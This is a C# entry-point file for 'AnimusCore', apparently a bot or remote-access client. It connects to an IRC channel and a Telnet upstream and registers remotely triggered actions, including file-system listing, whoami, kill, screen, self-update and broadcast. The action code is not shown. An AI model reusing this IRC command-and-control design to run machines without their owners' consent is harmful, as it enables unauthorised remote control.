using System;
using System.Linq;
using System.Threading;
using libanimus;
using libanimus.Actions;
using libanimus.Actions.Predefined;
using libanimus.Networking;
using System.Threading.Tasks;

namespace AnimusCore
{
	class MainClass
	{
		NetworkManager	network;
		ActionPool		actions;
		IrcUpstream		ircUpstream;
		public string	IRC_HOST;
		public int		IRC_PORT;

		public static void Main (string[] args) {
			new MainClass ().Main ();
		}

		public MainClass () {

			// Catch unhandled exceptions in tasks
			TaskScheduler.UnobservedTaskException += (sender, args) => {
				Console.WriteLine (args.Exception.Message);
				args.SetObserved();
			};

			// Update check
			Console.WriteLine ("Performing startup checks...");
			Updater.Instance.StartupCheck ();

			// Basic config
			IRC_HOST = "<server>";
			IRC_PORT = 6697;
			
			// Get instances
			network = NetworkManager.Instance;
			actions = ActionPool.Instance;

			// IRC upstream
			Console.WriteLine ("Connecting to IRC...");
			ircUpstream = new IrcUpstream ();
			ircUpstream.Connected += (sender, e) => ircUpstream.Join ("#animus");
			ircUpstream.Connect (IRC_HOST, IRC_PORT);
			network.RegisterUpstream (ircUpstream);

			// Telnet upstream
			Console.WriteLine ("Connecting to Telnet...");
			network.RegisterUpstream (new TelnetUpstream ());

			// Actions
			Console.WriteLine ("Registering actions...");
			actions.Register<ActionCd> ();
			actions.Register<ActionPwd> ();
			actions.Register<ActionUpdate> ();
			actions.Register<ActionUpgrade> ();
			actions.Register<ActionAutoUpgrade> ();
			actions.Register<ActionKill> ();
			actions.Register<ActionStartArgs> ();
			actions.Register<ActionDetect> ();
			actions.Register<ActionScreen> ();
			actions.Register<ActionLs> ();
			actions.Register<ActionWhoami> ();
			actions.Register<ActionBroadcast> ();
		}

		public void Main () {
			Idle ();
		}

		static void Idle () {
			Thread.Sleep (-1);
		}
	}
}
